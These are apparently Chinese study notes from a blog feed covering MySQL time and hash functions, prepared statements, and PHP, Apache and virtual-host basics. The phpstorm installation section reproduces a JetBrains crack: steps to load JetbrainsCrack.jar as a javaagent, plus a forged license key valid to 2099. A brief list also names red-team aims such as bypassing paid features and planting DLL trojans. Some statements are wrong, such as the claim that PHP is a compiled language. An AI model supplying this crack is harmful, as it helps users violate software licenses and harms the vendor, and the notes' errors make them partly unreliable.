<h4 id="1-7-3-时间类"><a href="#1-7-3-时间类" class="headerlink" title="1.7.3 时间类"></a>1.7.3 时间类</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 时间戳</span><br><span class="line">mysql&gt; select unix_timestamp();</span><br><span class="line">+------------------+</span><br><span class="line">| unix_timestamp() |</span><br><span class="line">+------------------+</span><br><span class="line">|       1560330458 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 格式化时间戳</span><br><span class="line">mysql&gt; select from_unixtime(unix_timestamp());</span><br><span class="line">+---------------------------------+</span><br><span class="line">| from_unixtime(unix_timestamp()) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| 2019-06-12 17:08:18             |</span><br><span class="line">+---------------------------------+</span><br><span class="line">1 row in set (0.05 sec)</span><br><span class="line"></span><br><span class="line">-- 获取当前格式化时间</span><br><span class="line">mysql&gt; select now();</span><br><span class="line">+---------------------+</span><br><span class="line">| now()               |</span><br><span class="line">+---------------------+</span><br><span class="line">| 2019-06-12 17:08:50 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 获取年，月，日，小时，分钟，秒</span><br><span class="line">mysql&gt; select year(now()) 年,month(now()) 月,day(now()) 日,hour(now()) 小时,minute(now()) 分钟,second(now())秒;</span><br><span class="line">+------+------+------+------+------+------+</span><br><span class="line">| 年   | 月   | 日    | 小时  | 分钟 | 秒     |</span><br><span class="line">+------+------+------+------+------+------+</span><br><span class="line">| 2019 |    6 |   12 |   17 |   10 |   48 |</span><br><span class="line">+------+------+------+------+------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 星期，本年第几天;</span><br><span class="line">mysql&gt; select dayname(now()) 星期,dayofyear(now()) 本年第几天;</span><br><span class="line">+-----------+------------+</span><br><span class="line">| 星期          | 本年第几天          |</span><br><span class="line">+-----------+------------+</span><br><span class="line">| Wednesday |        163 |</span><br><span class="line">+-----------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 日期相减</span><br><span class="line">mysql&gt; select datediff(now(),&#x27;2010-08-08&#x27;) 相距天数;</span><br><span class="line">+----------+</span><br><span class="line">| 相距天数         |</span><br><span class="line">+----------+</span><br><span class="line">|     3230 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="1-7-4-加密函数"><a href="#1-7-4-加密函数" class="headerlink" title="1.7.4 加密函数"></a>1.7.4 加密函数</h4><p>1、md5()</p>
<p>2、sha()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select md5(&#x27;aa&#x27;);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| md5(&#x27;aa&#x27;)                        |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| 4124bc0a9335c27f086f24ba207a4912 |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sha(&#x27;aa&#x27;);</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| sha(&#x27;aa&#x27;)                                |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| e0c9035898dd52fc65c41454cec9c4d2611bfb37 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h2 id="1-8-预处理"><a href="#1-8-预处理" class="headerlink" title="1.8  预处理"></a>1.8  预处理</h2><p>每个代码的段的执行都要经历：词法分析——语法分析——编译——执行</p>
<p>预编译一次，可以多次执行。用来解决一条SQL语句频繁执行的问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">预处理语句：prepare 预处理名字 from ‘sql语句’</span><br><span class="line">执行预处理：execute 预处理名字 [using 变量]</span><br></pre></td></tr></table></figure>

<p>例题：不带参数的预处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建预处理</span><br><span class="line">mysql&gt; prepare stmt from &#x27;select * from stuinfo&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.06 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">-- 执行预处理</span><br><span class="line">mysql&gt; execute stmt;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           |</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          |</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           |</span><br><span class="line">| s25305 | 诸葛丽丽         | 女      |     23 |       7 | 河南           |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           |</span><br><span class="line">| s25319 | 梅超风        | 女      |     23 |       5 | 河北          |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>例题：带一个参数的预处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建带有位置占位符的预处理语句</span><br><span class="line">mysql&gt; prepare stmt from &#x27;select * from stuinfo where stuno=?&#x27; ;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">-- 调用预处理，并传参数</span><br><span class="line">mysql&gt; delimiter //</span><br><span class="line">mysql&gt; set @id=&#x27;s25301&#x27;;</span><br><span class="line">    -&gt; execute stmt using @id //</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">| s25301 | 张秋丽        | 男       |     18 |       1 | 北京           |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>例题：传递多个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; prepare stmt from &#x27;select * from stuinfo where stuage&gt;? and stusex=?&#x27; //</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; set @age=20;</span><br><span class="line">    -&gt; set @sex=&#x27;男&#x27;;</span><br><span class="line">    -&gt; execute stmt using @age,@sex //</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>小结：</p>
<p>1、MySQL中变量以@开头</p>
<p>2、通过set给变量赋值</p>
<p>3、？是位置占位符</p>
]]></content>
  </entry>
  <entry>
    <title>PHP开发基础</title>
    <url>/2023/04/20/PHP%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="1-2PHP简介"><a href="#1-2PHP简介" class="headerlink" title="1.2PHP简介"></a>1.2PHP简介</h2><h4 id="1-2-1-概述"><a href="#1-2-1-概述" class="headerlink" title="1.2.1 概述"></a>1.2.1 概述</h4><p> PHP是Hypertext Preprocessor的缩写，（超文本预处理器）是一种在服务器端运行的<strong>开源的脚本语言</strong>。</p>
<p>LAMP组合(Linux,Apache,MySQL,PHP)，这四个产品都是公开源代码的产品</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php是一门语言，用来做业务逻辑</span><br><span class="line">apache为PHP提供了运行环境</span><br><span class="line">linux为Apache的运行提供了平台</span><br><span class="line">mysql数据库用来存储数据</span><br></pre></td></tr></table></figure>



<h4 id="1-2-2-五个基本概念"><a href="#1-2-2-五个基本概念" class="headerlink" title="1.2.2 五个基本概念"></a>1.2.2 五个基本概念</h4><p>1、静态页面和动态页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态页面：服务器不执行的页面</span><br><span class="line">动态页面：服务器执行的页面</span><br></pre></td></tr></table></figure>

<p>问题：动态网站中是否可以存放静态页面</p>
<p>答：  可以</p>
<p>2、客户端和服务器端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">浏览者这段是客户端</span><br><span class="line">服务器端：给浏览者提供服务</span><br></pre></td></tr></table></figure>

<p>3、端口和端口号        端口号的范围： 0-65535</p>
<p>通常情况下，源端口号是从客户端操作系统的可用端口范围中随机选择的。</p>
<p>例如，Windows 操作系统通常使用从 49152 到 65535 的端口范围，</p>
<p>而 Linux 系统通常使用从 32768 到 61000 的端口范围。</p>
<p>4、BS架构和CS架构</p>
<p>BS：通过浏览器去访问服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b:browser（浏览器）</span><br><span class="line">s:sever(服务器)</span><br><span class="line">优点：</span><br><span class="line">1、只要有浏览器就可以访问</span><br><span class="line">2、开发低</span><br><span class="line">缺点：</span><br><span class="line">1、开发的代码都放在服务器上    胖服务器-瘦客户端</span><br></pre></td></tr></table></figure>

<p>所有的web都是BS架构的</p>
<p>CS：通过客户端软件去访问服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:client（客户端）</span><br><span class="line">s:server(服务器)</span><br><span class="line">优点：</span><br><span class="line">1、可以开发客户端和服务器端，这时候就可以实现负载的均衡</span><br><span class="line">缺点：</span><br><span class="line">1、必须要安装一个软件才能去访问</span><br><span class="line">2、开发成本高</span><br></pre></td></tr></table></figure>

<p>CS做哪些红队相关操作：</p>
<p>C: 代码（忽视安全风险）–》信息收集（服务器&#x2F;端口&#x2F;API）</p>
<p>​			–》逆向（代码泄露）–》绕过收费功能</p>
<p>​			–》植入木马（dll）–》代码泄露</p>
<p>​			…..</p>
<p>S:服务器&#x2F;端口&#x2F;API   服务器功能</p>
<p>5、前台和后台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前台：用户所看到的（）</span><br><span class="line">---------------------------</span><br><span class="line">后台：网站管理员操作页面（安全风险）</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="1-2-3-PHP的优点"><a href="#1-2-3-PHP的优点" class="headerlink" title="1.2.3 PHP的优点"></a>1.2.3 PHP的优点</h4><ol>
<li>跨平台，既能在windows上运行，也能在linux上运行</li>
<li>源码开放：不会涉及到版权问题</li>
<li>语法简单：PHP入门简单</li>
<li>运行在服务器端，只要在服务器部署环境就可以了。</li>
</ol>
<h2 id="1-3Web介绍"><a href="#1-3Web介绍" class="headerlink" title="1.3Web介绍"></a>1.3Web介绍</h2><h4 id="1-3-1-web时代的变迁"><a href="#1-3-1-web时代的变迁" class="headerlink" title="1.3.1  web时代的变迁"></a>1.3.1  web时代的变迁</h4><p>从互联网开始崛起到现在，经历了从web1.0、2.0到web3.0的过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Web1.0（信息共享）的主要特点在于用户单纯的获取信息</span><br><span class="line">Web2.0（信息共建）更注重用户的交互作用，用户既是网站内容的浏览者，也是网站内容的制造者。</span><br><span class="line">Web3.0（信息传承）通过第三方信息平台对多家网站的信息进行整合，用户在互联网上拥有自己的数据，并能在不同网站上使用</span><br></pre></td></tr></table></figure>

<p>举例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Web1.0：来到一个餐馆，老板给你上了一盘番茄炒蛋；</span><br><span class="line">Web2.0：来到一个餐馆，你跟老板主动点了一份番茄炒蛋；</span><br><span class="line">Web3.0：来到一个餐馆，老板见到你就问，老规矩，还要番茄炒蛋？</span><br></pre></td></tr></table></figure>



<h4 id="1-3-2-Web服务原理"><a href="#1-3-2-Web服务原理" class="headerlink" title="1.3.2  Web服务原理"></a>1.3.2  Web服务原理</h4><p>静态网站原理（浏览器-服务器）</p>
<p>动态网站原理（浏览器-服务器-数据库）</p>
<p>智能网站原理（浏览器-服务器【分析推荐】-数据库）</p>
<h2 id="1-4搭建Web服务器"><a href="#1-4搭建Web服务器" class="headerlink" title="1.4搭建Web服务器"></a>1.4搭建Web服务器</h2><h4 id="1-4-1-安装phpstudy-amp-phpstorm"><a href="#1-4-1-安装phpstudy-amp-phpstorm" class="headerlink" title="1.4.1  安装phpstudy&amp;phpstorm"></a>1.4.1  安装phpstudy&amp;phpstorm</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Jetbrains Crack v2.7</span><br><span class="line"></span><br><span class="line">0. &#123;Product&#125; - product (clion, idea, etc.)</span><br><span class="line">&#123;InstallDir&#125; - the path to the installed product (CLion, IDEA, and so on)</span><br><span class="line"></span><br><span class="line">1. Copy JetbrainsCrack.jar to $ &#123;InstallDir&#125; / bin</span><br><span class="line">1.复制到安装目录</span><br><span class="line"></span><br><span class="line">2. Edit the file &quot;$ &#123;Product&#125; .vmoptions&quot; (or &quot;$ &#123;Product&#125; $ &#123;64&#125; .vmoptions&quot;) in the folder &#123;InstallDir&#125; / bin:</span><br><span class="line">2.编辑&#123;Product&#125; .vmoptions文件</span><br><span class="line"></span><br><span class="line">2.1 Add at the end of the file (from a new line):  添加下面这句内容</span><br><span class="line">-javaagent: &#123;安装目录&#125; /bin/JetbrainsCrack.jar</span><br><span class="line"></span><br><span class="line">for example（例如）: -javaagent:C:\Program Files\JetBrains\PyCharm 2018.1\bin\JetbrainsCrack.jar</span><br><span class="line">Note: &quot;-javaagent:C:\Program Files\...&quot; - without space!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. Run the product.运行程序</span><br><span class="line"></span><br><span class="line">4. Enter key  用下面这个key</span><br><span class="line"></span><br><span class="line">ThisCrackLicenseId-&#123;</span><br><span class="line">&quot;licenseId&quot;:&quot;ThisCrackLicenseId&quot;,</span><br><span class="line">&quot;licenseeName&quot;:&quot;Admin&quot;,</span><br><span class="line">&quot;assigneeName&quot;:&quot;&quot;,</span><br><span class="line">&quot;assigneeEmail&quot;:&quot;avxhm.se@gmail.com&quot;,</span><br><span class="line">&quot;licenseRestriction&quot;:&quot;Admin&quot;,</span><br><span class="line">&quot;checkConcurrentUse&quot;:false,</span><br><span class="line">&quot;products&quot;:[</span><br><span class="line">&#123;&quot;code&quot;:&quot;II&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;DM&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;AC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;RS0&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;WS&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;DPN&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;RC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;PS&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;DC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;RM&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;CL&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;PC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;</span><br><span class="line">],</span><br><span class="line">&quot;hash&quot;:&quot;2911276/0&quot;,</span><br><span class="line">&quot;gracePeriodDays&quot;:7,</span><br><span class="line">&quot;autoProlongated&quot;:false&#125;</span><br></pre></td></tr></table></figure>

<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="1-4-2-访问服务器"><a href="#1-4-2-访问服务器" class="headerlink" title="1.4.2 访问服务器"></a>1.4.2 访问服务器</h4><p>在www目录下创建demo.php页面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<p>访问服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问规则：http://服务器ip地址/php页面</span><br><span class="line">比如：</span><br><span class="line">http://localhost/demo.php</span><br><span class="line">http://127.0.0.1/demo.php</span><br></pre></td></tr></table></figure>



<h4 id="1-4-3-常用的命令"><a href="#1-4-3-常用的命令" class="headerlink" title="1.4.3 常用的命令"></a>1.4.3 常用的命令</h4><p>补充cmd命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">切换盘符	盘符+冒号</span><br><span class="line">进入目录	cd 目录地址</span><br></pre></td></tr></table></figure>

<p>Apache的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">httpd -v   查看apache版本号   version</span><br><span class="line">httpd -t   检测运行环境  test</span><br><span class="line"></span><br><span class="line">D:Apache24/bin&gt; httpd.exe -n ‘myApacheServer’ -k start</span><br><span class="line"></span><br><span class="line">移除apache服务器</span><br><span class="line">D:Apache24/bin&gt; httpd.exe -n ‘myApacheServer’ -k uninstall</span><br><span class="line"></span><br><span class="line">停止apache服务器</span><br><span class="line">D:Apache24/bin&gt; httpd.exe -n ‘myApacheServer’ -k stop</span><br><span class="line"></span><br><span class="line">重启apache服务器</span><br><span class="line">D:Apache24/bin&gt; httpd.exe -n ‘myApacheServer’ -k restart</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PHP的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -v  PHP版本号</span><br></pre></td></tr></table></figure>



<h4 id="1-4-4-互联网通讯原理"><a href="#1-4-4-互联网通讯原理" class="headerlink" title="1.4.4 互联网通讯原理"></a>1.4.4 互联网通讯原理</h4><p>本质一台电脑访问另外一台电脑资源、寻址过程（IP地址、端口、域名、DNS）</p>
<p>在互联网上，IP地址是用来区分每台计算机的标识，但是IP记忆不友好，我们将IP地址取一个名字，一个IP对应一个名字，这个名字就称为域名。</p>
<p> 步骤：</p>
<p>1、客户端输入域名（网址），在<strong>最近的机房</strong>做DNS解析（Domain Name Server）,DNS解析就是将域名转化成IP地址</p>
<p>2、通过IP地址访问服务器</p>
<h4 id="1-4-5-DNS解析"><a href="#1-4-5-DNS解析" class="headerlink" title="1.4.5  DNS解析"></a>1.4.5  DNS解析</h4><p>目标：ip地址访问服务器不方便，通过域名来访问</p>
<p>127.0.0.1 <a href="http://www.aaa.com/">www.aaa.com</a></p>
<p>hosts文件（C:\windows\system32\drivers\etc\）</p>
<p>hosts文件用来做DNS解析</p>
<p>ipconfig &#x2F;flushdns清理DNS缓存</p>
<h2 id="1-5服务器配置"><a href="#1-5服务器配置" class="headerlink" title="1.5服务器配置"></a>1.5服务器配置</h2><h4 id="1-5-1-虚拟目录配置"><a href="#1-5-1-虚拟目录配置" class="headerlink" title="1.5.1  虚拟目录配置"></a>1.5.1  虚拟目录配置</h4><h5 id="1、更改虚拟目录"><a href="#1、更改虚拟目录" class="headerlink" title="1、更改虚拟目录"></a><strong>1、更改虚拟目录</strong></h5><p>要更改虚拟目录的位置，需要到apache的配置文件中更改（conf&#x2F;httpd.conf)</p>
<p>​	在phpstudy中，httpd.conf和vhost.conf。都有配置虚拟目录的指令，并且两个配置文件中都有配置虚拟目录的指令，</p>
<p>（为了测试，我们可以注释掉vhost.conf的引入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">httpd.conf：</span><br><span class="line">DocumentRoot &quot;D:/phpstudy_pro/WWW&quot;</span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">    Options +Indexes +FollowSymLinks +ExecCGI</span><br><span class="line">    AllowOverride none</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">vhost.conf：</span><br><span class="line">DocumentRoot &quot;D:/phpstudy_pro/WWW&quot;</span><br><span class="line">&lt;Directory &quot;D:/phpstudy_pro/WWW&quot;&gt;</span><br><span class="line">    Options +Indexes +FollowSymLinks +ExecCGI</span><br><span class="line">    AllowOverride none</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>







<p>更改虚拟目录</p>
<p>提醒：项目上线以后，不可以显示目录结构</p>
<p>权限的练习</p>
<p>例题一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Order allow,deny</span><br><span class="line">Allow from all</span><br><span class="line"># </span><br></pre></td></tr></table></figure>

<p>例题二：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Order allow,deny</span><br><span class="line">Allow from all</span><br><span class="line">Deny from all</span><br><span class="line"># 拒绝所有</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>练习三：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Order allow,deny</span><br><span class="line">Deny from all</span><br><span class="line">Allow from all</span><br><span class="line"># 拒绝所有</span><br></pre></td></tr></table></figure>

<p>练习四：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory &quot;C:/PHP/Apache/htdocs&quot;&gt;</span><br><span class="line">   Order deny, allow</span><br><span class="line">   Allow from 192.168.101.50</span><br><span class="line">   Deny from 192.168</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">#拒绝192.168开头的 除了 192.168.101.50</span><br></pre></td></tr></table></figure>

<p>练习五：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory &quot;C:/PHP/Apache/htdocs&quot;&gt;</span><br><span class="line">    Order deny, allow</span><br><span class="line">    Allow from 192.168.101.50</span><br><span class="line">   Deny from all</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"># 拒绝所有 除了192.168.101.50</span><br></pre></td></tr></table></figure>

<p>练习六：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory &quot;C:/PHP/Apache/htdocs&quot;&gt;</span><br><span class="line">   Order allow,deny</span><br><span class="line">   Allow from 192.168</span><br><span class="line">   Deny from 192.168.101.50</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"># 运行192.168开头的IP 除了192.168.101.50</span><br></pre></td></tr></table></figure>



<h5 id="2、更改默认首页"><a href="#2、更改默认首页" class="headerlink" title="2、更改默认首页"></a><strong>2、更改默认首页</strong></h5><p>在httpd.conf配置文件中</p>
<p><img src="/PHP%E5%BC%80%E5%8F%91.assets/image-20230223141805095.png" alt="image-20230223141805095"></p>
<p>默认首页的查找顺序，从前往后。</p>
<h5 id="3、更改监听端口"><a href="#3、更改监听端口" class="headerlink" title="3、更改监听端口"></a><strong>3、更改监听端口</strong></h5><p>在httpd.conf配置文件中设置，通过Listen指令设置监听的端口</p>
<p>可以设置多个监听端口</p>
<p>访问：</p>
<p>http:&#x2F;&#x2F;域名:端口号&#x2F;demo.php</p>
<p>补充：查看端口的占用情况</p>
<p>在命令行下使用 netstat -ano查看</p>
<p>在结果中查找字符串</p>
<h4 id="1-5-2-虚拟主机配置"><a href="#1-5-2-虚拟主机配置" class="headerlink" title="1.5.2  虚拟主机配置"></a>1.5.2  虚拟主机配置</h4><p>需求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入www.baidu.com	打开web1的网站  |</span><br><span class="line">输入www.sina.com打开web2的网站		|2</span><br></pre></td></tr></table></figure>

<p>配置过程：</p>
<p> 要配置虚拟主机，需要在httpd.conf中引入虚拟主机的培训文件（vhosts.conf）</p>
<p>vhosts.conf配置如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost _default_:80&gt;</span><br><span class="line">  DocumentRoot &quot;C:\web1&quot;       #指定虚拟目录路径</span><br><span class="line">  ServerName www.baidu.com     # 虚拟目录绑定的域名</span><br><span class="line">  DirectoryIndex aa.php        # 默认首页</span><br><span class="line">  &lt;Directory &quot;C:\web1&quot;&gt;</span><br><span class="line">    Options -Indexes -FollowSymLinks +ExecCGI	#开启/关闭目录访问</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">    Require all granted</span><br><span class="line">  &lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost _default_:80&gt;</span><br><span class="line">DocumentRoot &quot;C:\web2&quot;</span><br><span class="line"> ServerName www.sina.com</span><br><span class="line"> DirectoryIndex bb.php</span><br><span class="line">  &lt;Directory &quot;C:\web2&quot;&gt;</span><br><span class="line">    Options -Indexes -FollowSymLinks +ExecCGI</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">    Require all granted</span><br><span class="line">  &lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>



<p>在host文件中做dns解析</p>
<p>访问结果</p>
<p><img src="/PHP%E5%BC%80%E5%8F%91.assets/image-20230223152805078.png" alt="image-20230223152805078"></p>
<p>补充：站点、虚拟目录、虚拟主机的区别</p>
<p>站点：站点就是一个文件夹，用来保存与网站有关的所有素材</p>
<p>虚拟目录：站点+权限</p>
<p>虚拟主机：虚拟目录+域名</p>
<h2 id="1-6-PHP语法入门"><a href="#1-6-PHP语法入门" class="headerlink" title="1.6  PHP语法入门"></a>1.6  PHP语法入门</h2><h4 id="1-6-1-PHP是编译型语言"><a href="#1-6-1-PHP是编译型语言" class="headerlink" title="1.6.1  PHP是编译型语言"></a>1.6.1  PHP是编译型语言</h4><p>编译语言和解释语言的区别在于是否保存最终的可执行程序。</p>
<h4 id="1-6-2-PHP定界符"><a href="#1-6-2-PHP定界符" class="headerlink" title="1.6.2 PHP定界符"></a>1.6.2 PHP定界符</h4><p>因为PHP是脚本语言，所以需要定界符</p>
<p>1、标准风格（推荐使用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;i am a boy!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>提醒，如果整个页面都是PHP代码，PHP结束符是可以省略的（推荐）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;i am a boy!&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p>2、短标记风格（默认情况下不支持，需要在php配置文件中开启支持段标记）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;锄禾日当午&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<p>小结：</p>
<p>httpd.conf是apache的配置文件</p>
<p>php.ini是php的配置文件</p>
<h4 id="1-6-3-注释"><a href="#1-6-3-注释" class="headerlink" title="1.6.3  注释"></a>1.6.3  注释</h4><p>单行注释： &#x2F;&#x2F;和# </p>
<p>多行注释：  &#x2F;*    *&#x2F;</p>
<h4 id="1-6-4-PHP输出语句"><a href="#1-6-4-PHP输出语句" class="headerlink" title="1.6.4 PHP输出语句"></a>1.6.4 PHP输出语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo:输出</span><br><span class="line">print:输出，输出成功返回1</span><br><span class="line">print_r()：输出数组</span><br><span class="line">var_dump():输出数据的详细信息，带有数据类型和数据长度</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	var_dump(&#x27;abc&#x27;);	//string(3) &quot;abc&quot; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



